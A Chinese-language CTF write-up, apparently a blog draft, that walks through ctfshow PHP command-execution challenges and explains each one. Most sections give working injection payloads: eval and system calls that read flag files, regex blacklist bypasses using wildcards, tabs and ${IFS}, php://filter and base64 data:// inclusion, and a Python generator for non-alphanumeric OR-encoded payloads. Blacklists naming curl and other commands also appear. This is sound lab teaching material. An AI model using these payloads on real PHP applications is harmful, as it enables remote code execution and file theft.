---
title: 有趣的命令执行
date: 2026-09-11
category: CTF
tags:
  - CTF
  - Writeup
  - web
summary: PHP命令执行（理论来说处于篇幅考虑这篇只是一部分吧）
draft: true
---

# 有趣的命令执行

> 紧接着之前的《关于信息搜集》，我们来进一步的进行讲解。
> 此外有关爆破的内容因为较为简单先不做讲解

# PHP的代码解读

一般来说，当你拿到了php的源码，如果在面对命令执行的语句中，就也可能有拿到shell的手段，我们接下来以ctfshow里的例题为来学习吧

## 字符过滤型代码执行
### pt.1.1

```php
<?php  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

因为刚刚开始解出php可能对于一些函数命令有些生疏，所以这边可以逐句解释一下

首先
```php
error_reporting(0);
```

是在屏蔽了所有的错误提示，防止报错而顺带把服务器信息也暴露了

```php
if(isset($_GET['c'])){    $c = $_GET['c'];  
```

检查GET请求中是否传入了参数 c ，如果传入了，把 c 赋值给 $c
GET传参，也就是 `$_GET` 是这道题的其中一个知识点，这让我们知道了这道题是用GET方法来传参的，因此后面的传参可以直接使用 `/?c=...` 来实现

```php
if(!preg_match("/flag/i", $c)){  
        eval($c);  
    } 
```

很关键的一处代码，这是个正则表达式，意思就是，如果 $c 不包含（这个“不”字源自于if后面括号里的感叹号）flag，则执行下面的代码。
而这里 `i` 的意思则是不区分大小写，因此Flag FLag这样的形式都不行
关键的来了，下面的执行的代码竟然是 eval()

`eval()`函数在php里是很危险的函数，相当于把$c里的字符当作命令来执行

而最后一行
```php
else{    highlight_file(__FILE__);  }
```

就是说如果没有传 c 参数，则高亮显示当前文件，而当前文件则是php源码，那么整道题逻辑就看懂了。

我们要做的是拿flag，也就是调用system来cat flag
一般来说cat flag的指令是
```php
system(cat flag);
```
很遗憾的是，但是遗憾的是，这里有两个问题：
1. 一般来说cat这个命令太常见了所以就导致了基本上任何一个搭建平台的人都会把cat给屏掉。
2. 这道题本身就不允许直接输入flag来查询

这里我们需要补充的小知识即
>tac 命令是相当于 cat 的倒过来的拼写，执行的效果也是反着的——cat是从第一行读到最后一行，tac是从最后一行读到第一行。而关键就在于tac相较于cat一般被用作后门代码，是可以使用的

那么问题一解决了
第二个问题我们有三个解法
1. 我们可以通过构造通配符`?`来绕过检测
2. 我们可以通过编码后解码来绕过
3. 我们可以通过php拼接字符串操作来绕过

`值得注意的是，如果以URL的编码来上传，经过浏览器解码之后会直接变成flag从而不能绕过检测`
因此最后我们可以用例如这样的形式来打穿
`https://xxx.ctf.show/?c=system("tac fla?.php")`
或者把里面的内容换成`"tac fla"."g.php"`也可以

>不过这种题目打穿它的方式太多了，这里也就不多说了
### pt.1.2

来看它的加强，其他不变，唯独在判定上变成了
```php
if(!preg_match("/flag|system|php/i", $c))
```
这道题禁用了上道题我们采用的system和php，所以我们需要另辟蹊径

这里是需要学习的地方
>PHP支持用反引号``执行系统命令，等价于shell_exec

因此我们可以使用 
```php
`tac f*`;
```

但是实际上你执行了之后页面并没有显示内容
因为我们还缺少了一个命令就是 echo 
>echo的作用就是把执行的结果显示在页面上

也就是说，你需要在外层再加一个echo
就变成了
```php
?c=echo`tac f*`;
```
这样就可以过了

### pt.1.3

加强pro
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c))
```
虽然感觉这道题的严格判定看上去并不影响，但是我们注意到了空格也被ban了，因此我们就不能打空格了...吗？
空格在URL的显示是%20，我们只需要找一个可以代替空格，URL和空格不一样的即可
在Linux命令行中，命令与参数之间、参数与参数之间，无论有多少个空格（或 Tab），Linux 的 Shell 都会把它们压缩成一个分隔符来解析。
也就是说，不用空格，用Tab也可以达到同样的效果
>Tab在URL上的格式是%09，和空格不一样，因此在这道题是可以绕过的

就变成了
```php
?c=echo`tac%09f*`;
```
于是就可以过了

那有人要问了要是tab和空格以及所有空白字符（换行%0a，回车%0d）全都不行呢？
1. 可以用\${IFS}变量，在linux中，\$IFS是默认的系统分隔符，系统解析的时候会把它自动替换成分隔符
2. 利用< >的重定向符

不过这些都属于下下策了。

### pt.1.4

666还有第四关
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))
```
这下坏了啥都不给用了

我们再了解新的函数
>include是PHP的一个导入文件的关键字，可以把目标文件的字节读进来然后塞到当前位置当代码/文本处理

比如
```php
# a.php
<?php $x = 1; ?>
hello

# b.php
include 'a.php';
# 等价于在 b.php 这行现场写下：
# <?php $x = 1; ?>
# hello
```

但是include在真正的网站中如果不能直接include一个php文件，就是要有文件路径或流
`include $path  #path (php://filter、data://等)`
而文件里的 `<?php ... ?>` 的代码则会被执行
如果遇到了非 `<?php ... ?>` 的内容则会直接当 HTML 原样输出
当然失败了会警告之后继续跑，成功了会返回1，所以 print include 会返回 1

也就相当于我们可以
```php
?c=include"flag.php"
```
>当然include的规则是：后面的路径可以不用跟include直接空格空开，也满足了这道题的筛选条件

当然这样子直接放flag和php是不行的会被过滤
而include没有通配符这种概念...flag\*这样的也不行
不过有个办法就是，因为网站只对c进行过滤，如果我们把里面的flag拉到外面来，也就是说，我们单独再设置一个GET量，这样的话就可以绕过了
** 这是"参数分离 / 拆分过滤"绕过  **
因此我们要引入第二个知识点了

>\$\_GET[1] 来设置一个新的GET请求，而里面的1则是和c一样是新的参数名

表达式可以如下
```php
?c=include$_GET[1]?>&1=...
```

稍微需要注意两点的是
1. **?>** 是用来替代 `;` 的，因为 `;` 也被ban了，而这里的 `?>` 其实是和 `;` 有点区别的，前者是php语句的结束，打了这个就相当于关闭了PHP的标签，而后者则是一句话的语句结束符，在 `?>` 之后，剩下的内容会被当作HTML语言解析。但是如果这句话作为最后一条语句收尾的话， `;` 和 `?>` 的作用就相等了
2. 就算 `?c=include$_GET[1]?>&1=flag.php` 也不行，虽然语句可以执行成功，但是由于flag.php会被当作php语言执行，所以页面不会回显，办法就是绕过php解析器

>绕过php解析器的办法就是把里面的内容给编码（比如base64）之后，让解析器读不出php语言，然后这样就可以输出了

```php
php://filter              # PHP 内置的流包装器：读写数据的中转站
# 相当于php过滤
convert.base64-encode     # 过滤器：数据流过时被 base64 编码（convert 是分类，base64-encode 是过滤器名）
resource=flag.php         # 固定参数：指定真正读哪个文件/流
```

连起来就是
```php
include"php://filter/convert.base64-encode/resource=flag.php"
```

而和之前的合成一下就是最终的payload
```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

回显结果base64解一下就行了
>小知识点，标准格式应该有个\[read/write]的格式但是不写默认是read所以可以省略，完整payload如下
```php
php://filter/read=convert.base64-encode/resource=flag.php
```


甚至后面一题的
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c))
```
和
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)
```
还有
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c))
```
都过了，这个payload可太强了

### pt.1.5

稍微加强了下
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c))
```
不让你用数字了说是

那就把数字改成字母就行了
```php
?c=include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

注意GET里的 a 理论上是要用 `'a'` 引起来的（不引起来就不会把这个a当作后面参数a，它只会作为一个常量a来用），因为PHP8环境下不引起来会被当作常量，但是因为这道题的环境是PHP7（恰好兼容）不是PHP8导致恰好可以用纯的 `a` ，而引号题目又不给用，我觉得可能是出题者故意为之...

### pt.1.6

现在的过滤变得更严了
```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c))
```

这都啥啊，怎么把什么都ban了，这我还怎么打啊喂！
不过嘛...仔细看这个括号，我们惊喜地发现这个竟然是全角符号的括号！也就是正常我们打的 () 都是没有关系的！
所以这道题的解法就是纯函数调用，有关于纯函数调用我们这里又要再讲一讲，因为初来乍到所以函数的一些名字包括它的用法可能还有些不熟悉，所以这边给出了一些表帮助记忆

| 函数                                             | 作用                                   | 在这题里的角色                                  |
| ---------------------------------------------- | ------------------------------------ | ---------------------------------------- |
| `localeconv()`                                 | 返回本地化格式配置的数组                         | 数组第一个元素正好是字符串 `.`，不写点号就能拿到「当前目录」         |
| `pos()` / `current()`                          | 取数组当前指针指向的元素（互为别名）                   | 把 `localeconv()` 的第一个值 `.` 取出来           |
| `scandir($dir)`                                | 列出目录下的文件名，返回数组（含 `.` 和 `..`，默认按名字升序） | 扫描当前目录，拿到文件列表                            |
| `array_reverse($arr)`                          | 反转数组顺序，返回新数组                         | 把 `flag.php` 翻到前面，方便一步取到                 |
| `next($arr)`                                   | 指针后移一格，返回该元素                         | 取出反转后的第二个元素 `flag.php`                   |
| `end($arr)`                                    | 指针移到末尾，返回最后一个元素                      | 备选：直接拿最后一个文件名                            |
| `prev($arr)`                                   | 指针前移一格，返回上一个元素                       | 备选：指针在首位时返回 false，这题基本用不上                |
| `array_shift($arr)`                            | 删除并返回第一个元素                           | 备选：取第一个                                  |
| `array_pop($arr)`                              | 删除并返回最后一个元素                          | 备选：取最后一个                                 |
| `show_source($file)` / `highlight_file($file)` | 高亮输出文件源码                             | 打印 `flag.php` 的源码，flag 就在里面              |
| `readfile($file)`                              | 读取文件并直接输出                            | 备选：原样输出，不带语法高亮                           |
| `file_get_contents($file)`                     | 读取文件并返回字符串                           | 备选：要配合 `print` 才能显示                      |
| `print`                                        | 输出（语言结构，不是函数）                        | 配合 `file_get_contents()` 使用              |
| `system($cmd)`                                 | 执行系统命令并输出结果                          | 这题只能跑纯字母命令（点、斜杠、星号都被 ban），读不到 `flag.php` |
| `array_slice($arr, $offset, $len)`             | 截取数组的一段                              | 这题用不了：至少两个参数，逗号被 ban                     |
| `array_search($needle, $arr)`                  | 按值查找，返回对应键                           | 这题用不了：两个参数 + 要写字符串                       |

然后可能对 `localeconv()` 不太理解，其实它就是一个php的内置函数，然后本身以数组的形式存在，里面是\[ `.` , `千位分隔符` , `国际货币符号` , ...... \] ，而这个 `.` 又是在黑名单之后才会被解析出来，就相当于我们可以绕过解析了

所以
```php
pos(localeconv())
```
的意思就是取出 `.` ！

而接下来我们使用 
```php
scandir(pos(localeconv()))
```
就可以获得一个当前目录下的数组\[ `.` , `..` , `flag.php` , `index.php` \]

flag在倒数第二个，我们的解决办法就是给它倒过来然后我们取下一个，最后读取，查找表格，最终的php上就应该是这么写的
```php
show_source(next(array_reverse(scandir(pos(localeconv)))))
```
究极套娃的来了...

>这里可能会有小问题就是为什么要倒过来再next，不能next嵌套三次吗？因为next是跳到下一个之后直接返回了里面的字符串，所以next不能套娃，刚刚开始可能有误区...


### pt.2.1

大体和上面一样，也是过滤词，只是情景有些不同
```php
<?php
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c);  
        echo $flag;  
      
    }  
          
}else{    highlight_file(__FILE__);  
}
```
这里的 c 因为是在include下面的，所以它不再是代码而是路径了
这个时候你会疑惑一下下，include明明是一个路径，怎么执行命令了呢？

回忆一下 `include` 的功能，include 做的是：**把该路径里的内容读出来，如果是php文件，里面 的php代码就会被执行。而如果是纯文本则原样输出**

那这道题flag最后怎么出来呢，代码里面写了
```php
include($c); // 包含 $c 指向的文件
echo $flag;  // 输出变量 $flag
```

而flag.php里面的内容大概就是
```php
<?php $flag = "ctfshow{xxx}"; ?>
```

所以其实我们只需要把路径放到flag.php下面，然后它就会自动返回flag了

**那么我们要怎么做**
这道题`?c=fla?.php`并不行，因为不能有通配符啊喂
所以我们讲一个新知识

`allow_url_include`
>allow_url_include 是PHP的一个安全配置项，控制着include、require这样的语句能不能直接使用URL比如 http:// 或者 data:// 作为包含目标

它决定了你的include(\$c)里的 `$c` 能不能是 远程地址或者是数据流 而不止是简单的一个文件地址，如果开启了，就可以用 `data://` 或 `php://input` 这类伪协议，把一段PHP代码“伪装”成文件让include去执行
要去查看也很简单，我们可以先测data://协议，它通常需要`allow_url_include` 和 `allow_url_fopen` 都开启
```php
?c=data://text/plain,<?php phpinfo(); ?>
```
![[_web pt.2-1.png]]
而最后的结果也确实是这样的

这样的话我们就可以使用 URL 了。但是问题又随之而来：
正常的`?c=data://:text/plain,<?php system('cat fla?.php');?>` 也不可以，这是因为这串里有 `<` `>` `?` `空格` `'` `;` `(` `)`。**query string 里这些字符是"不安全"的**。`>` `<` 虽然合法但是很多客户端和服务器会转义或拒绝。`空格`在URL 里面必须 `%20` 否则非法。而后面的那四个字符虽然合法但是基本上只要是开了WAF就会拦。

那怎么办呢？一般来说遇到这样的情况，我们的标准操作都是把它编码了之后再传，纯数字+字母就不会出现这样的情况。

我们来看data的结构
```text
data:[<mediatype>][;base64],<data>
```

也就是说如果要base64，我们就可以这么写
```text
data://text/plain;base64,PD9waHAg...
│      │         │       │
│      │         │       └── 真正的内容（base64 编码后的数据）
│      │         └────────── 声明"后面的数据是 base64 编码的"，注意后面是分号
│      └──────────────────── MIME 类型：text/plain
└─────────────────────────── 协议名 data
```

其中的MIME类型在这里只是浏览器和解析器来判断它的内容类型，不过在php的include来说，基本不关心MIME类型，但是至少得是一个合法的，text/plain 就是一种。至于前面data://这个双杠其实加不加都可以，php都认，标准写法是data: ，而php里写的是 data://

此外，编码方式有且只有base64可以选，这是由 data:// 协议遵循的 RFC2397 标准决定的（感兴趣可以去看看[RFC 2397: The "data" URL scheme | RFC Editor](https://www.rfc-editor.org/info/rfc2397/)）要么base64编码，要么原文

那么接下来的事情就由繁化简了，我们只要考虑base64里面的payload怎么写就行了
>include会把流的内容当作php文件来解析，而语法规则和.php文件完全一样

那我们直接在后面写上`<?php system("tac flag.php");?>`的base64作为负载就行了

```php
/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==
```
即可

然后这里因为讲到了 `data://` 和 `php://filter` 。所以我们来看看他们的区别在哪

|                     | `php://filter` | `data://`           |
| ------------------- | -------------- | ------------------- |
| 后面的负载是面对哪里          | 必须是服务器的文件      | 自己写的内容在服务器上（php则执行） |
| 目的                  | 读资源            | 执行/输出你写的内容          |
| 需要后面有resource       | Y              | N                   |
| 需要allow_url_include | N              | Y                   |
| 经典用处                | 读源码、绕解析        | PHP代码执行             |


下一关就算是
```php
if(!preg_match("/flag|php|file/i", $c))
```
我们也可以打过

你发现我们用的是data而不是file所以也可以过，顺便这里提到了file那就讲讲file
>file:// 数据来源必须是不能加工过的原样的完整服务器本地路径，但是这种东西你一看不能加工就知道了依托答辩，这样的方式但凡有点防护都不可能让你过了。

所以记住file://的功能是 ⊂ php://filter 的

且这两者是等价的
```php
include "file://var/www/html/flag.php";
include "var/www/html/flag.php";
```

### pt.2.2

阴的来了，我们来看改动
```php
    if(!preg_match("/flag/i", $c)){  
        include($c.".php");
```
如果把.php单独拎出来，阁下该如何应对呢？

之前的那个payload肯定是不行了，因为base64后面跟了个.php就无法解码了，那我们换一个策略，直接明文，然后**冷暴力**后面的.php，因为当我们前面的语句是完整php语言的时候，后面就算是.php也只能按照文本输出，这就是这道题的小巧思

payload如下

```php
/?c=data://text/plain,<?php%20system(%27tac%20fla*%27);?>
// 其实 /?c=data://text/plain,<?php system('tac fla*');?> 也可以只不过会URL解析成上面那种形式
```
你会发现，就算是.php了，也是`/?c=data://text/plain,<?php%20system(%27tac%20fla*%27);?>.php`，在完整php语言的后面可以说这个.php一点卵用没有

### pt.3.1

神的来了
```php
<?php
if(isset($_POST['c'])){    $c = $_POST['c'];  
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){  
        eval("echo($c);");  
    }  
}else{    highlight_file(__FILE__);  
}  
?>
```

谁家好人又不让我们输数字又不让我们输字母的，检查一下我们发现其实还有一个 `|` 可以。

>`|` 是按字节或的意思，可能不太理解，我们先来看看最基础的 `或` 的逻辑：1 | 1 = 1  1 | 0 = 1  0 | 1 = 1  0 | 0 = 0  也就是有 1 出 1 ，全 0 才出 0 

比如反引号的二进制位置是 0110 0000 ， 而 控制字节 DC3 的位置是 0001 0011，这两者或以下得到了 0111 0011 = 's' 
也就是说我们可以完全利用一些在限制范围以外的字符以及那些非打印字符来用 `|` 来制造出我们想要的字符串

>而且其实 `|` 的运算是可以叠加的，也就是我们可以 a | b | c | d 来四合一 --> `|` 就是一个n输入的或门

那么接下来就是通过写脚本来得出，有哪些限制的字符串是可以通过 | 来得到的
```python
# 用法: py -3.12 de.py system "cat /flag"
import sys, urllib.parse

BAD = {*range(48,58), *range(65,91), *range(97,123), *map(ord,"^+~$[]{}&-")}

def pair(c):
    t = ord(c)
    for a in range(256):
        b = t & ~a
        if a not in BAD and not a & ~t and b not in BAD:
            return chr(a), chr(b)

def build(name, cmd):
    A, B = zip(*map(pair, name))
    C, D = zip(*map(pair, cmd))
    return "('%s'|'%s')('%s'|'%s')" % ("".join(A), "".join(B), "".join(C), "".join(D))

if __name__ == "__main__":
    print("c=" + urllib.parse.quote(build(sys.argv[1], sys.argv[2])))

```

注意当POST提交的时候，一定要在请求头上加一个
```http
Content-Type: application/x-www-form-urlencoded
```
不然后面的请求体不当URL解析的...


### pt.4.1

重定向了
```php
if(isset($_GET['c'])){    $c=$_GET['c'];    system($c." >/dev/null 2>&1");
```
可以看到我们虽然 c 没有限制，但是我们重定向了

>尖尖指向谁，就定向到它那里

也就是这道题会把 c 的地址重定向到 /dev/null （后面的 2>&1 指的是把标准错误重定向到标准输出，其实不用很在意）

突破点在于，我们只要在我们输的语句这里加个 `;` ，让前面的单独成句，然后隔断后面的重定向。
那就很简单了

```php
/?c=cat%20flag.php;
```
但是你会发现页面是白色的，是因为cat出来的是php源码而浏览器相应会当html渲染，因此页面上是看不到的，你要 `Ctrl + U` 查看源码才可以看到，当然如果你想在页面上看见你也可以

```php
/?c=base64%20flag.php;
```
这样就可以看到base64编码之后的flag.php了

### pt.4.2

加强
```php
    if(!preg_match("/\;|cat/i", $c)){        system($c." >/dev/null 2>&1");
```
这下之前的 `;` 没法用了，那么我们需要另外找方法了，这里介绍其它的分隔符

| 种类       | ;   | \n (%0a) | &&       | \|\|     |
| -------- | --- | -------- | -------- | -------- |
| 和后面语句的关系 | 执行  | 执行       | 前者成功执行后者 | 前者成功跳过后者 |
`& 和 | 暂不介绍`

所以这道题有两个方法就是把 `;` 换成 `||` 或者 `%0a`
当然cat也要换成tac

```php
/?c=tac%20flag.php||
```

而后面的
```php
    if(!preg_match("/;|cat|flag/i", $c)){        system($c." >/dev/null 2>&1");
```

只要改成
```php
/?c=tac%20fla*||
```
就行了

下一个
```php
    if(!preg_match("/\;|cat|flag| /i", $c)){        system($c." >/dev/null 2>&1");
```

空格不让用了很简单，我们只要换成tap就行了
```php
/?c=tac%09fla*||
```

而
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){        system($c." >/dev/null 2>&1");
```

没ban`?`啊所以随便写
```php
/?c=tac%09fla?.php||
/?c=tac%09f???????|| //甚至这个都可以
```

666盐都不盐了，甚至这三个都过了！**一招鲜，吃遍天！**
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){        system($c." >/dev/null 2>&1");

    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){        system($c." >/dev/null 2>&1");
    
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){        system($c." >/dev/null 2>&1");
```

这么强大的过滤...关我f???????什么事情啊
```php
/?c=tac%09f???????|| 
```

### pt.4.3

till...
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){        system($c." >/dev/null 2>&1");
```

这里我们发现 `x09` 也就是 `%09` — `Tab` 被ban了，那我们就用用重定向呗，但是一定要注意重定向有两个点：
1. 重定向的文件名字必须是准确的文件名（相对路径也可以），不能含有通配符，那这里的flag连起来了怎么办？很简单，加一个 `fla\g` `f\l\a\g` 或者 `"fla"g` `fla''g` `fla""g` 都是可以的。`\` 是转义字符，意思是保留下个字符的字面意思并移除自身，经常在比如你想要符号比如 || 的本身但是不想要它的功能的时候会用到——也就是去除后面字符功能的意思。而 `""` 的作用是保护内部字符不被特殊解析成参数内容，引用部分可以和非引用部分拼接成一个完整单词，就是为什么引号也可以用的原因。
2. 重定向的方向虽然之前讲过了，但是可能还是不知道这道题是 `tac<fla\g.php` 还是 `tac>fla\g.php` ，我们要把flag的内容放在tac返回，所以是前者。那如果重定向符号反了会发生什么事情呢？
>重定向的规则是，单个重定向符eg<——把定向源的内容覆盖目标地址的内容（目标地址先清空后从头写，也叫 truncate + write）。两个重定向符eg<<——在原有目标地址的内容上添加定向源的内容

所以千万不要写错重定向的符号方向，不然的话会导致你想要的文件被清空 `比如tac>fla\g.php就会导致flag.php里的内容被tac（本身为空）覆盖，导致flag.php再想读取也读不出来了！！`

所以正确的payload是
```php
?c=tac<fla\g.php||
```


有点加强的来
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){        system($c." >/dev/null 2>&1");
```
这道题的tac被ban了

没事我们列出其它可以的方法

| 命令           | 写法                       | 输出格式                    | 说明              |
| ------------ | ------------------------ | ----------------------- | --------------- |
| `dd`/`paste` | dd\<fla\g.php\|\|        | 原文（隐藏，需要ctrl+u）         | 一定有这个指令         |
| `xxd`        | 同上                       | 十六进制可见（原文如果见不到也要ctrl+u） | 服务器安装后也不失为一种选择  |
| `rev`        | 同上                       | 倒序可见文本                  | 需要你自己再reverse一下 |
| `nl`         | 同上                       | 带行号（同样需要ctrl+u）         |                 |
| `tee`        | tee\<fla\g.php>o.txt\|\| | 写文件                     | 需要配合访问o.txt     |
所以你这道题随便挑一个写就行了
e.g.
```php
/?c=paste<fla\g.php||
```

### pt.4.4

把重定向也ban了现在你开心了吧！
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){        system($c." >/dev/null 2>&1");
```

不要急，我们观察发现了这个黑名单其实有小漏洞——`$`竟然解ban了，那么这道题就是靠 `${IFS}` 来充当空格使用了

我们直接
```php
/?c=nl${IFS}fla\g.php||
```

666还有第二关
```php
|   |
|---|
|1 <?php|
...
|13|
|14|
|15 $flag="flag_here";|
```
flag并不在这里，也就说明这道题它学坏了，flag放到别的地方去了

我们接下来只能一层层返回看看这个网站到底有什么了
```php
/?c=ls${IFS}..||
/?c=ls${IFS}../..||
/?c=ls${IFS}../../..||
```

最后我们在根目录里面发现了
```php
|   |
|---|
|bin|
|dev|
|etc|
|flag|
|home|
...
```
这下好了flag原来是在根目录啊，那我们的目标就是拿到根目录的flag即可

我们只要
```php
/?c=nl$IFS/fla\g||
```
即可

>有人好奇 `$IFS` 和 `${IFS}` 区别在哪里，其实他们的功能都一样的，加大括号是防止和后面的字符混在一起，$IFS在字母数字下划线前面必须加 { } ，而 / - 可以不用加


